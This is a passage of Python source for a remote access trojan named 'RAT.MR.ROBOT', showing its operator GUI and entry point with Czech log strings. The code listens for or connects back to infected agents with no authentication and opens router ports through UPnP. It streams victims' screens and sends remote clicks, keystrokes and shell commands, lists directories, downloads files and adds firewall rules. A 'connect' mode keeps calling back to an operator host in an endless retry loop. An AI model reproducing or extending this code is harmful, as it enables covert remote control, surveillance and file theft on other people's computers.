        cmd = [sys.executable] + ([] if getattr(sys, "frozen", False) else [THIS])
        cmd += ["connect", "127.0.0.1", str(p), "--test"]
        try:
            self.tproc = subprocess.Popen(cmd, creationflags=0x08000000 if os.name == "nt" else 0)
        except Exception as e:
            return self.log(f"! test {e}")
        self.b_test.config(text="STOP TEST", fg=RED)
        self.log("* TEST agent 127.0.0.1 - vse na tvem PC")

    def ping(self):
        ip = self.v_ip.get().strip()
        if not ip:
            return self.log("! chybi ip")
        try:
            p = int(self.v_port.get())
        except ValueError:
            return self.log("! spatny port")
        self.log(f"* ping {ip}:{p}")

        def w():
            s = socket.socket()
            s.settimeout(4)
            try:
                s.connect((ip, p))
                self.q.put(("log", f"* {ip}:{p} REACHABLE"))
            except Exception as e:
                self.q.put(("log", f"! {ip}:{p} {e}"))
            finally:
                s.close()
        threading.Thread(target=w, daemon=True).start()

    def listen(self):
        if self.listening:
            self.listening = False
            try:
                self.srv.close()
            except OSError:
                pass
            self.b_lis.config(text="START LISTEN", fg=FG)
            self.l_st.config(text="idle", fg=AMBER)
            return
        try:
            p = int(self.v_port.get())
        except ValueError:
            return self.log("! spatny port")
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", p))
            s.listen(32)
        except OSError as e:
            return self.log(f"! bind {p}: {e} (port obsazen?)")
        self.srv = s
        self.listening = True
        self.b_lis.config(text="STOP LISTEN", fg=RED)
        self.l_st.config(text=f"listening :{p}", fg=FG)
        self.log(f"* listening :{p} [AUTH OPEN] LAN {self.l_lan.cget('text')}:{p}")
        threading.Thread(target=self._accept, args=(s,), daemon=True).start()
        threading.Thread(target=self._pubip, args=(p,), daemon=True).start()

    def _accept(self, s):
        while self.listening:
            try:
                c, a = s.accept()
            except OSError:
                break
            x = Sess(c, a)
            self.q.put(("conn", x))
            threading.Thread(target=self._reader, args=(x,), daemon=True).start()

    def _reader(self, x):
        while x.alive:
            m = recv_msg(x.s)
            if m is None:
                break
            self.q.put(("msg", x, m))
        self.q.put(("close", x))

    def _pubip(self, p):
        import urllib.request
        try:
            ip = urllib.request.urlopen("https://api.ipify.org", timeout=6).read().decode()
        except Exception:
            ip = "-"
        self.q.put(("ip", ip))
        self.q.put(("upnp", p))

    def upnp(self):
        try:
            p = int(self.v_port.get())
        except ValueError:
            return

        def w():
            try:
                import miniupnpc
                u = miniupnpc.UPnP()
                u.discoverdelay = 2000
                u.discover()
                u.selectigd()
                u.addportmapping(p, "TCP", u.lanaddr, p, "RATMR", "")
                self.q.put(("log", f"* UPnP ok {u.externalipaddress()}:{p}"))
            except Exception as e:
                self.q.put(("log", f"! UPnP {e.__class__.__name__} - port forward / tunel / LISTEN"))
        threading.Thread(target=w, daemon=True).start()

    def connect_out(self):
        ip = self.v_ip.get().strip()
        if not ip:
            return self.log("! chybi ip")
        try:
            p = int(self.v_port.get())
        except ValueError:
            return self.log("! spatny port")
        self.l_st.config(text=f"joining {ip}:{p}", fg=AMBER)

        def w():
            try:
                s = socket.create_connection((ip, p), timeout=8)
            except OSError as e:
                self.q.put(("log", f"! join {ip}:{p} {e}"))
                self.q.put(("st", ("idle", AMBER)))
                return
            s.settimeout(None)
            x = Sess(s, (ip, p))
            self.q.put(("log", f"* joined {ip}:{p}"))
            self.q.put(("conn", x))
            threading.Thread(target=self._reader, args=(x,), daemon=True).start()
        threading.Thread(target=w, daemon=True).start()

    def _pump(self):
        if self.tproc and self.tproc.poll() is not None:
            self.tproc = None
            self.b_test.config(text="TEST", fg=AMBER)
        try:
            while True:
                it = self.q.get_nowait()
                k = it[0]
                if k == "conn":
                    self._conn(it[1])
                elif k == "msg":
                    self._msg(it[1], it[2])
                elif k == "close":
                    self._close(it[1])
                elif k == "ip":
                    self.l_ip.config(text=it[1])
                elif k == "st":
                    self.l_st.config(text=it[1][0], fg=it[1][1])
                elif k == "upnp":
                    self.upnp()
                elif k == "log":
                    self.log(it[1])
        except queue.Empty:
            pass
        self.after(40, self._pump)

    def _conn(self, x):
        self.sessions[(x.a[0], x.a[1], time.time())] = x
        key = f"{x.a[0]}:{x.a[1]}"
        for i in range(self.lst.size() - 1, -1, -1):
            if self.lst.get(i).startswith(key):
                self.lst.delete(i)
        self.lst.insert("end", key)
        self.log(f"* {key} accepted (no auth)")
        self.lst.selection_clear(0, "end")
        self.lst.selection_set("end")
        self._sel()
        x.send({"t": "stream", "on": True, "fps": 2})
        x.streaming = True
        self.b_stream.config(text="STREAM [on]", fg=RED)
        x.send({"t": "shot"})

    def _close(self, x):
        x.alive = False
        if self.active is x:
            self.active = None
            self.cv.delete("all")
            self.cimg = None
            self.b_stream.config(text="STREAM [off]", fg=FG_MID)
        self.log(f"* {x.a[0]} odpojen")
        key = f"{x.a[0]}:{x.a[1]}"
        for i in range(self.lst.size()):
            if self.lst.get(i).startswith(key):
                self.lst.delete(i)
                break

    def _sel(self, _=None):
        s = self.lst.curselection()
        if not s:
            return
        ip = self.lst.get(s[0]).split(":")[0]
        for x in self.sessions.values():
            if x.a[0] == ip and x.alive:
                self.active = x
                self.t_info.delete("1.0", "end")
                for k, v in x.info.items():
                    self.t_info.insert("end", f"{k}: {v}\n")
                self.b_stream.config(text="STREAM [on]" if x.streaming else "STREAM [off]",
                                     fg=RED if x.streaming else FG_MID)
                self.cv.delete("all")
                self.cimg = None
                if x.frame:
                    self._draw()
                return

    def _msg(self, x, m):
        t = m.get("t")
        if t == "hello":
            x.info = {k: m.get(k) for k in ("name", "user", "os", "screen") if m.get(k)}
            if m.get("test"):
                x.test = True
                key = f"{x.a[0]}:{x.a[1]}"
                for i in range(self.lst.size()):
                    if self.lst.get(i).startswith(key) and "[TEST]" not in self.lst.get(i):
                        self.lst.delete(i)
                        self.lst.insert(i, key + "  [TEST]")
                        self.lst.selection_clear(0, "end")
                        self.lst.selection_set(i)
                        break
                self.log("* TEST rezim - vse na tvem PC")
            if self.active is x:
                self.t_info.delete("1.0", "end")
                for k, v in x.info.items():
                    self.t_info.insert("end", f"{k}: {v}\n")
            self.log(f"* {x.a[0]} -> {m.get('user')}@{m.get('name')}")
        elif t == "shot":
            try:
                raw = zlib.decompress(base64.b64decode(m["data"]))
                x.frame = (raw, int(m["w"]), int(m["h"]))
            except Exception as e:
                return self.log(f"! frame {e}")
            if self.active is x:
                self._draw()
        elif t == "text":
            self.t_out.insert("end", m.get("text", "") + "\n")
            self.t_out.see("end")
        elif t == "file":
            p = filedialog.asksaveasfilename(initialfile=m.get("name", "f.bin"))
            if p:
                with open(p, "wb") as f:
                    f.write(base64.b64decode(m["data"]))
                self.log(f"* ulozeno {p}")

    def _draw(self):
        if not self.active or not self.active.frame:
            return
        raw, w, h = self.active.frame
        cw, ch = self.cv.winfo_width(), self.cv.winfo_height()
        if cw < 20:
            return
        try:
            ph = photo_from(raw, w, h)
        except Exception as e:
            return self.log(f"! render {e}")
        k = max(1, int(w / max(1, cw)))
        if k > 1:
            ph = ph.subsample(k)
        self.ph = ph
        if self.cimg is None:
            self.cimg = self.cv.create_image(cw // 2, ch // 2, image=ph)
        else:
            self.cv.itemconfig(self.cimg, image=ph)
            self.cv.coords(self.cimg, cw // 2, ch // 2)

    def _norm(self, x, y):
        if not self.cimg:
            return None
        a = self.cv.bbox(self.cimg)
        if not a:
            return None
        x0, y0, x1, y1 = a
        if not (x0 <= x <= x1 and y0 <= y <= y1):
            return None
        return (x - x0) / (x1 - x0), (y - y0) / (y1 - y0)

    def _press(self, e):
        self.cv.focus_set()
        n = self._norm(e.x, e.y)
        if not n or not self.active:
            return
        if self.mode.get() == "mouse":
            self._send({"t": "click", "x": n[0], "y": n[1], "button": "left"})
        elif self.mode.get() == "draw":
            self.drag = (e.x, e.y)
            self._send({"t": "draw", "op": "point", "x": n[0], "y": n[1],
                        "color": self.dcol, "w": self.sc.get()})

    def _move(self, e):
        if self.mode.get() != "draw" or not self.drag or not self.active:
            return
        n = self._norm(e.x, e.y)
        if not n:
            return
        self.cv.create_line(*self.drag, e.x, e.y, fill=self.dcol, width=self.sc.get(),
                            capstyle="round", tags="local")
        self.drag = (e.x, e.y)
        self._send({"t": "draw", "op": "line", "x": n[0], "y": n[1],
                    "color": self.dcol, "w": self.sc.get()})

    def _right(self, e):
        n = self._norm(e.x, e.y)
        if n and self.active:
            self._send({"t": "click", "x": n[0], "y": n[1], "button": "right"})

    def _key(self, e):
        if not self.active:
            return
        if e.keysym in VK:
            self._send({"t": "key", "key": e.keysym})
        elif e.char:
            self._send({"t": "type", "text": e.char})
        return "break"

    def stream(self):
        if not self.active:
            return
        self.active.streaming = not self.active.streaming
        self._send({"t": "stream", "on": self.active.streaming, "fps": 2})
        self.b_stream.config(text="STREAM [on]" if self.active.streaming else "STREAM [off]",
                             fg=RED if self.active.streaming else FG_MID)

    def msgbox(self):
        t = self.e_msg.get().strip()
        if not t:
            return
        self._send({"t": "msgbox", "title": "Message from operator", "text": t})
        self.e_msg.delete(0, "end")
        self.log(f"> msgbox: {t}")

    def open_prog(self):
        p = filedialog.askopenfilename()
        if p:
            self._send({"t": "open", "target": os.path.basename(p)})

    def open_url(self):
        u = simpledialog.askstring("URL", "URL:")
        if u:
            self._send({"t": "url", "url": u})

    def wallpaper(self):
        p = filedialog.askopenfilename(filetypes=[("Images", "*.bmp *.jpg *.png")])
        if not p:
            return
        with open(p, "rb") as f:
            d = base64.b64encode(f.read()).decode()
        self._send({"t": "wallpaper", "name": os.path.basename(p), "data": d})
        self.log(f"> wallpaper {os.path.basename(p)}")

    def ls(self):
        d = simpledialog.askstring("LIST", "Path:", initialvalue="C:\\")
        if d:
            self._send({"t": "ls", "path": d})

    def get(self):
        f = simpledialog.askstring("DOWNLOAD", "Path:")
        if f:
            self._send({"t": "get", "path": f})

    def cmd(self):
        c = self.e_cmd.get().strip()
        if not c:
            return
        self.t_out.insert("end", f"\n> {c}\n")
        self._send({"t": "cmd", "cmd": c})
        self.e_cmd.delete(0, "end")

    def disc(self):
        if self.active:
            self._send({"t": "close"})
            self.active.kill()


# =================== startovni okno ===================
class Launcher(tk.Tk):
    def __init__(self):
        super().__init__()
        self.report_callback_exception = hook
        self.title("RAT.MR.ROBOT")
        self.configure(bg=BG)
        self.geometry("420x400")
        self.resizable(False, False)
        tk.Label(self, text="RAT.MR.ROBOT", font=("Consolas", 22, "bold"), fg=FG, bg=BG).pack(pady=(24, 0))
        tk.Label(self, text="created by injectorX69", font=FS, fg=FG_DIM, bg=BG).pack()
        tk.Label(self, text="AUTH OPEN", font=FB, fg=AMBER, bg=BG).pack(pady=(6, 20))
        tk.Button(self, text="SERVER  (operator)", font=("Consolas", 12, "bold"), bg=BG3, fg=FG,
                  activebackground=FG, activeforeground=BG, relief="flat", height=2,
                  command=lambda: self._go("server")).pack(fill="x", padx=30, pady=6)
        tk.Button(self, text="AGENT  (tento PC)", font=("Consolas", 12, "bold"), bg=BG3, fg=FG_MID,
                  activebackground=FG, activeforeground=BG, relief="flat", height=2,
                  command=lambda: self._go("agent")).pack(fill="x", padx=30, pady=6)
        tk.Label(self, text="server = ridis | agent = byt ovladan",
                 font=FS, fg=FG_DIM, bg=BG).pack(pady=14)
        tk.Label(self, text="log: rat.log", font=FS, fg=FG_DIM, bg=BG).pack()

    def _go(self, m):
        self.destroy()
        if m == "server":
            s = Server()
            s.after(400, s.listen)
            s.mainloop()
        else:
            AgentUI().run()


def main():
    a = [x for x in sys.argv[1:] if not x.startswith("--")]
    alog(f"start argv={sys.argv[1:]}")
    if a and a[0].lower() == "server":
        s = Server()
        s.after(400, s.listen)
        s.mainloop()
        return
    if a and a[0].lower() == "agent":
        AgentUI().run()
        return
    if a and a[0].lower() == "connect" and len(a) >= 3:
        h, p = a[1], int(a[2])
        while True:
            try:
                serve(join_forever(h, p))
            except Exception as e:
                alog(f"serve {e}")
            time.sleep(RETRY)
    if a and a[0].lower() == "listen" and len(a) >= 2:
        p = int(a[1])
        fw_rule(p)
        while True:
            try:
                serve(listen_once(p))
            except Exception as e:
                alog(f"listen {e}")
            time.sleep(RETRY)
    Launcher().mainloop()


if __name__ == "__main__":
    main()